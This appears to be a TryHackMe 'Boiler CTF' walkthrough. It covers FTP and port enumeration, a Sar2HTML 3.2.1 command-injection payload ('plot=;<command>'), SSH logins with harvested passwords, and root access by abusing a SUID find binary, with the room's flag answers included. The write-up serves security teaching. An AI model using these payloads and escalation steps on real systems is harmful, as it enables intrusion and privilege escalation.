# Boiler CTF — TryHackMe Walkthrough

> Intermediate level CTF. Just enumerate, you'll get there.


<p align="center">
  <a href="https://imgbb.com/"><img src="https://i.ibb.co/kVpvNzqs/4a800c6513239dbdfaf74ce869a88add.jpg" alt="4a800c6513239dbdfaf74ce869a88add" border="0"></a>
</p>

<p align="center">
  <a href="https://tryhackme.com/room/boilerctf2">
    <img src="https://img.shields.io/badge/TryHackMe-Boiler%20CTF-red?logo=tryhackme&logoColor=white">
  </a>
  <img src="https://img.shields.io/badge/Difficulty-Intermediate-orange">
  <img src="https://img.shields.io/badge/Platform-Linux-black">
  <img src="https://img.shields.io/badge/Focus-Enumeration%20%7C%20Exploitation%20%7C%20PrivEsc-blue">
</p>

---

## Topics Covered

| # | Topic |
|---|-------|
| 1 | FTP Enumeration |
| 2 | Network Enumeration |
| 3 | Web Enumeration |
| 4 | Exploitation — Joomla / Sar2HTML 3.2.1 |
| 5 | Stored Passwords & Keys |
| 6 | Abusing SUID/GUID |

---

## Learning Objectives

By the end of this walkthrough, you will be able to:

- Enumerate services running on non-standard ports
- Perform directory brute-forcing against a web server
- Identify and exploit a Remote Code Execution vulnerability in Sar2HTML
- Locate credentials stored insecurely in shell scripts
- Escalate privileges using a misconfigured SUID binary

---


## Task 1 — Enumeration

> *"Just enumerate, you'll get there."*

---

### Question 1 — What file extension is found after anonymous FTP login?

**Approach:** Connect to the FTP server using the `anonymous` account. List all files (including hidden ones with `-la`) and look at what's there.

```
kali@kali:~/CTFs/tryhackme/Boiler CTF$ ftp Machine_IP
Connected to 10.10.57.168.
220 (vsFTPd 3.0.3)
Name (10.10.57.168:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 .
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 ..
-rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt
226 Directory send OK.
ftp> get .info.txt
local: .info.txt remote: .info.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .info.txt (74 bytes).
226 Transfer complete.
74 bytes received in 0.00 secs (87.1720 kB/s)
ftp> exit
221 Goodbye.
kali@kali:~/CTFs/tryhackme/Boiler CTF$ cat .info.txt
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
kali@kali:~/CTFs/tryhackme/Boiler CTF$ cat .info.txt | tr '[A-Za-z]' '[N-ZA-Mn-za-m]'
Just wanted to see if you find it. Lol. Remember: Enumeration is the key!
```

> **Note:** The file content is encoded in **ROT13**. The `tr` command decodes it by shifting each letter 13 positions in the alphabet. It is a decoy message — the real answer is simply the file extension itself.

<details>
<summary>Reveal Answer</summary>

**`txt`**

</details>

---

### Question 2 — What is running on the highest port?

**Approach:** Run a full-port Nmap scan (`-p-`) with service detection (`-sV`) and default scripts (`-sC`) to identify all open services across all 65535 ports.

```
kali@kali:~/CTFs/tryhackme/Boiler CTF$ sudo nmap -sS -sC -sV -O -p- Machine_IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-07 14:07 CEST
Nmap scan report for 10.10.57.168
Host is up (0.056s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)
|   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)
|_  256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)
Nmap done: 1 IP address (1 host up) scanned in 89.41 seconds
```

> **Note:** SSH is running on port **55007** — a non-standard port chosen to avoid quick detection. This is a common tactic in hardened environments. Always scan all ports with `-p-` to avoid missing services like this.

<details>
<summary>Reveal Answer</summary>

**`SSH`**

</details>

---

### Question 3 — What's running on port 10000?

**Approach:** The Nmap scan already identifies this. You can also navigate to `https://Machine_IP:10000/` in a browser to confirm the service.

> **Note:** Webmin is a web-based server administration panel commonly used to manage Linux servers. It frequently runs on port 10000 by default.

<details>
<summary>Reveal Answer</summary>

**`Webmin`**

</details>

---

### Question 4 — Can you exploit the service running on port 10000?

**Approach:** Check exploit databases such as [exploit-db.com](https://exploit-db.com) for known vulnerabilities in Webmin 1.930. While vulnerabilities exist in this version, they are not exploitable in this particular environment.

<details>
<summary>Reveal Answer</summary>

**`nay`**

</details>

---

### Question 5 — What CMS can you access?

**Approach:** Use `gobuster` to brute-force directories on the web server and discover hidden paths.

```
kali@kali:~/CTFs/tryhackme/Boiler CTF$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://Machine_IP/
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://Machine_IP/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/07 13:36:23 Starting gobuster
===============================================================
/manual (Status: 301)
/joomla (Status: 301)
/server-status (Status: 403)
Progress: 105022 / 220561 (47.62%)^C
[!] Keyboard interrupt detected, terminating.
```

> **Note:** `/joomla` returns a `301 Redirect`, confirming the directory exists. Joomla is a widely-used open-source Content Management System (CMS). Finding it here gives us a clear next target for further enumeration.

<details>
<summary>Reveal Answer</summary>

**`joomla`**

</details>

---

### Question 6 — Keep enumerating, you'll know when you find it.

**Approach:** Continue digging deeper into the Joomla installation. Enumerate subdirectories within `/joomla` to find hidden or interesting folders.

<details>
<summary>Reveal Answer</summary>

**`No answer needed`**

</details>

---

### Question 7 — What is the interesting file name in the folder?

**Approach:** Browse to `http://Machine_IP/joomla/_files/` — you will find a suspicious filename. It appears to be Base64 encoded. Decode it twice to reveal the hidden message.

```
kali@kali:~/CTFs/tryhackme/Boiler CTF$ echo "VjJodmNITnBaU0JrWVdsemVRbz0K" | base64 -d | base64 -d
Whopsie daisy
```

> **Note:** The string is **double Base64 encoded**. Always try decoding multiple times when output still looks garbled after the first decode.

Next, browse to `http://Machine_IP/joomla/_test/` — you will find a **Sar2HTML** instance running.

**Sar2HTML 3.2.1** has a known Remote Code Execution (RCE) vulnerability:

- Reference: [Exploit-DB — Sar2HTML 3.2.1 RCE](https://www.exploit-db.com/exploits/47204)
- Payload format: `http://<ip>/index.php?plot=;<command-here>`
- Example: `http://Machine_IP/joomla/_test/index.php?plot=;ls%20-la`

Using this exploit, read the contents of `log.txt` to retrieve the password: **`superduperp@$$`**

<details>
<summary>Reveal Answer</summary>

**`log.txt`**

</details>

---

## Task 2 — Privilege Escalation

> *"You can complete this with manual enumeration, but do it as you wish."*

**SSH into the machine** using the credentials found in the previous task:

- **User:** `basterd`
- **Password:** `superduperp@$$`
- **Port:** `55007`

```
kali@kali:~/CTFs/tryhackme/Boiler CTF$ ssh basterd@Machine_IP -p 55007
basterd@Machine_IP's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

8 packages can be updated.
8 updates are security updates.

Last login: Thu Aug 22 12:29:45 2019 from 192.168.1.199
```

---

### Question 1 — Where was the other user's password stored? (no extension, just the name)

**Approach:** List the files in `basterd`'s home directory. A shell script called `backup.sh` is present — read its contents carefully.

```
$ ls -la
total 16
drwxr-x--- 3 basterd basterd 4096 Aug 22  2019 .
drwxr-xr-x 4 root    root    4096 Aug 22  2019 ..
-rwxr-xr-x 1 stoner  basterd  699 Aug 21  2019 backup.sh
-rw------- 1 basterd basterd    0 Aug 22  2019 .bash_history
drwx------ 2 basterd basterd 4096 Aug 22  2019 .cache
$ /bin/bash
basterd@Vulnerable:~$ cat backup.sh
```

```sh
REMOTE=1.2.3.4

SOURCE=/home/stoner
TARGET=/usr/local/backup

LOG=/home/stoner/bck.log

DATE=`date +%y\.%m\.%d\.`

USER=stoner
#superduperp@$$no1knows

ssh $USER@$REMOTE mkdir $TARGET/$DATE


if [ -d "$SOURCE" ]; then
    for i in `ls $SOURCE | grep 'data'`;do
             echo "Begining copy of" $i  >> $LOG
             scp  $SOURCE/$i $USER@$REMOTE:$TARGET/$DATE
             echo $i "completed" >> $LOG

                if [ -n `ssh $USER@$REMOTE ls $TARGET/$DATE/$i 2>/dev/null` ];then
                    rm $SOURCE/$i
                    echo $i "removed" >> $LOG
                    echo "####################" >> $LOG
                                else
                                        echo "Copy not complete" >> $LOG
                                        exit 0
                fi
    done
else
    echo "Directory is not present" >> $LOG
    exit 0
fi
```

> **Note:** The password `superduperp@$$no1knows` for user `stoner` is stored in a **comment** inside the script. Developers sometimes leave credentials hardcoded in scripts — always read any scripts you find on the system.

<details>
<summary>Reveal Answer</summary>

**`backup`**

</details>

---

### Question 2 — Read user.txt

**Approach:** Switch to user `stoner` using the password found in `backup.sh`, then look for the flag file.

```
basterd@Vulnerable:~$ su stoner
Password:
stoner@Vulnerable:/home/basterd$ cd ~
stoner@Vulnerable:~$ ls -la
total 16
drwxr-x--- 3 stoner stoner 4096 Aug 22  2019 .
drwxr-xr-x 4 root   root   4096 Aug 22  2019 ..
drwxrwxr-x 2 stoner stoner 4096 Aug 22  2019 .nano
-rw-r--r-- 1 stoner stoner   34 Aug 21  2019 .secret
stoner@Vulnerable:~$ cat .secret
You made it till here, well done.
```

> **Note:** The flag is stored in a hidden file called `.secret`. Files beginning with a dot are hidden from a standard `ls` listing. Always use `ls -la` to reveal them.

<details>
<summary>Reveal Answer</summary>

**`You made it till here, well done.`**

</details>

---

### Question 3 — What did you exploit to get root?

**Approach:** Search the filesystem for binaries with the **SUID bit** set. SUID binaries execute with the file owner's privileges (typically root), making them a high-value privilege escalation target.

```
stoner@Vulnerable:~$ find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null
-rwsr-xr-x 1 root root 38900 Mar 26  2019 /bin/su
-rwsr-xr-x 1 root root 30112 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 26492 May 15  2019 /bin/umount
-rwsr-xr-x 1 root root 34812 May 15  2019 /bin/mount
-rwsr-xr-x 1 root root 43316 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 38932 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 13960 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-- 1 root www-data 13692 Apr  3  2019 /usr/lib/apache2/suexec-custom
-rwsr-xr-- 1 root www-data 13692 Apr  3  2019 /usr/lib/apache2/suexec-pristine
-rwsr-xr-- 1 root messagebus 46436 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 513528 Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 5480 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 36288 Mar 26  2019 /usr/bin/newgidmap
-r-sr-xr-x 1 root root 232196 Feb  8  2016 /usr/bin/find
-rwsr-sr-x 1 daemon daemon 50748 Jan 15  2016 /usr/bin/at
-rwsr-xr-x 1 root root 39560 Mar 26  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 74280 Mar 26  2019 /usr/bin/chfn
-rwsr-xr-x 1 root root 53128 Mar 26  2019 /usr/bin/passwd
-rwsr-xr-x 1 root root 34680 Mar 26  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root root 159852 Jun 11  2019 /usr/bin/sudo
-rwsr-xr-x 1 root root 18216 Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 78012 Mar 26  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 36288 Mar 26  2019 /usr/bin/newuidmap
```

> **Note:** `/usr/bin/find` has the SUID bit set and is owned by root. This means any command passed via `find`'s `-exec` flag runs with root privileges. This is a well-known misconfiguration — see [GTFOBins/find](https://gtfobins.github.io/gtfobins/find/) for reference.

<details>
<summary>Reveal Answer</summary>

**`find`**  
Full entry: `-r-sr-xr-x 1 root root 232196 Feb 8 2016 /usr/bin/find`

</details>

---

### Question 4 — Read root.txt

**Approach:** Exploit the SUID `find` binary to change permissions on `/root`, then read the root flag.

```
stoner@Vulnerable:~$ find . -exec chmod -R 777 /root \;
stoner@Vulnerable:~$ ls -l /root
total 4
-rwxrwxrwx 1 root root 29 Aug 21  2019 root.txt
stoner@Vulnerable:~$ cat /root/root.txt
It wasn't that hard, was it?
stoner@Vulnerable:~$
```

> **Note:** `find . -exec <command> \;` runs the given command once per file found. Because `find` runs as root (SUID), the `chmod -R 777 /root` command executes with root privileges, opening the `/root` directory to all users.

<details>
<summary>Reveal Answer</summary>

**`It wasn't that hard, was it?`**

</details>

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Anonymous FTP login | Found `.info.txt` (ROT13 encoded decoy) |
| 2 | Full Nmap port scan | Discovered SSH on port 55007, Webmin on 10000 |
| 3 | Gobuster directory brute-force | Found `/joomla` CMS |
| 4 | Joomla sub-enumeration | Found `_test/` running Sar2HTML 3.2.1 |
| 5 | Sar2HTML RCE exploit | Read `log.txt`, retrieved credentials |
| 6 | SSH as `basterd` | Found `backup.sh` containing `stoner`'s password |
| 7 | Switched to `stoner` | Read `user.txt` flag |
| 8 | SUID `find` abuse | Gained root access and read `root.txt` |" />
